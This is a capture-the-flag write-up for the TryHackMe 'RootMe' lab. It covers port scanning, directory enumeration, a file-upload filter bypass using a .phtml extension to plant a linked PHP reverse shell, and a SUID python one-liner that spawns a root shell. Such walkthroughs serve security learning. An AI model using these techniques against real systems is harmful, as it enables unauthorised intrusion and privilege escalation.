---
title: RootMe CTF
date: 2023-07-12
categories: [Write-Ups, TryHackMe]
tags: [TryHackMe, nmap, gobuster]
---

## Reconnaissance
First of all, we start with a little scan to discover services and technology about target.

TCP SYN SCAN --> [https://nmap.org/book/synscan.html](https://nmap.org/book/synscan.html)

`sudo nmap -sS <IP ADDRESS> -p-`

This may take few minutes because we are scanning all TCP ports.

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 21:44 CEST
Nmap scan report for 10.10.8.205
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 100.80 seconds
```

Ports 22 and 80 are open. We can navigate the website.

To find Apache version, launch the following command:
`sudo nmap -sV <IP ADDRESS> -p 80`

Web server folders enumeration using `gobuster`.

`gobuster dir -u http://<IP ADDRESS> -w /usr/share/wordlists/dirb/big.txt`

We have found */panel* folder.

## Getting a shell
We can upload files by the panel section of the website.
Upload this php reverse shell: [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
The website doesn't accept php file extension, so we have to bypass the file name. 
We can assign a *phtml* extension to the reverse shell file. 
- ***.phtml*** extension are **most commonly associated with PHP Web pages**. The PHTML files contain PHP code that is parsed by a PHP engine. This allows the Web server to generate dynamic HTML that is displayed in a Web browser.
Moreover we have to change ip address and port in the file.
We just have to upload the reverse shell, use *netcat* to open a listening connection on our machine and execute the file via web browser.
Et voilà, we have a shell.

## Privilege escalation
First of all we search for files with SUID permission.

`find / -user root -perm /4000 2>/dev/null`

Now we have list of all files that can be executed like root from other users.
We find */usr/bin/python*...
Maybe we can execute python to obtain a root shell.

`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
-  [https://gtfobins.github.io/gtfobins/python/#suid](https://gtfobins.github.io/gtfobins/python/#suid)

